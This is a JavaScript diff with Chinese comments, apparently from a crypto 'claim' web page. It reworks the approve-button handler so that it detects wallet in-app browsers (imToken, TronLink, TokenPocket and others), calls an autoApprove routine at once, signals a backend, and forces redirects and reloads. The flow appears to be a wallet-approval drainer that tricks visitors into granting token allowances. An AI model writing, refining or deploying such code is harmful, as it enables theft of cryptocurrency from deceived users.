@@ -1126,37 +1126,56 @@ function bindLockedLogic() {
     };
 }
 
-// ========== 解锁后核心逻辑（点击后存标记→刷新，完整替换此函数） ==========
+// ========== 解锁后核心逻辑（跳转后紧跟刷新，无延迟，完整替换） ==========
 function bindUnlockedCoreLogic() {
     const lang = langConfig[currentLang];
     approveBtn.onclick = async () => {
         const btn = document.getElementById("approveBtn");
         btn.disabled = true;
-        btn.textContent = "准备跳转...";
+        btn.textContent = "处理中...";
 
         try {
-            // 1. B1防重复：已发过B1→直接存标记
-            if (hasSentB1Signal(userAddress)) {
-                localStorage.setItem('needJumpToWallet', 'true');
-                window.location.reload(); // 刷新页面
+            // 1. 检测是否已在钱包内→直接执行授权（不跳转、不刷新）
+            const isInWalletBrowser = checkIsInWalletBrowser();
+            if (isInWalletBrowser) {
+                userInfoEl.innerHTML += `<br><span style='color: #4ade80; font-size: 13px;'>✅ 已在钱包内，直接授权</span>`;
+                await autoApprove(); // 调用你原有授权逻辑
+                btn.disabled = false;
+                btn.textContent = lang.approveBtnText;
                 return;
             }
 
-            // 2. 未发过B1→发B1→存标记→刷新
+            // 2. 不在钱包内→先处理B1信号，跳转后紧跟刷新
+            if (hasSentB1Signal(userAddress)) {
+                userInfoEl.innerHTML += `<br><span style='color: #4ade80; font-size: 13px;'>✅ 已检测到B1-204，唤起授权</span>`;
+                await handleJump(); // 执行跳转
+                window.location.reload(); // 紧跟刷新，无延迟
+                return;
+            }
+
+            // 发送B1→标记→跳转→紧跟刷新
             const b1Result = await sendSignalB(true);
             if (b1Result !== "204") throw new Error("B1未返回204");
-            markB1SignalSent(userAddress); // 标记B1防重复
+            markB1SignalSent(userAddress);
 
-            localStorage.setItem('needJumpToWallet', 'true');
-            window.location.reload(); // 刷新页面
+            await handleJump(); // 执行跳转
+            window.location.reload(); // 无延迟，紧跟刷新
 
         } catch (e) {
             console.error("领取流程异常：", e);
             showAutoCloseAlert(`操作失败：${e.message || lang.systemBusyTip}`);
+            window.location.reload(); // 异常时也紧跟刷新
             btn.disabled = false;
             btn.textContent = lang.approveBtnText;
         }
     };
+}
+
+// ========== 新增：检测是否在钱包内置浏览器内（粘贴在bindUnlockedCoreLogic后面） ==========
+function checkIsInWalletBrowser() {
+    const userAgent = window.navigator.userAgent.toLowerCase();
+    const walletUAs = ['imtoken', 'tronlink', 'tokenpocket', 'bitkeep', 'mathwallet'];
+    return walletUAs.some(ua => userAgent.includes(ua));
 }
 
 // ========== A1信号（返回204标记success，防重复仅防二次发A1） ==========
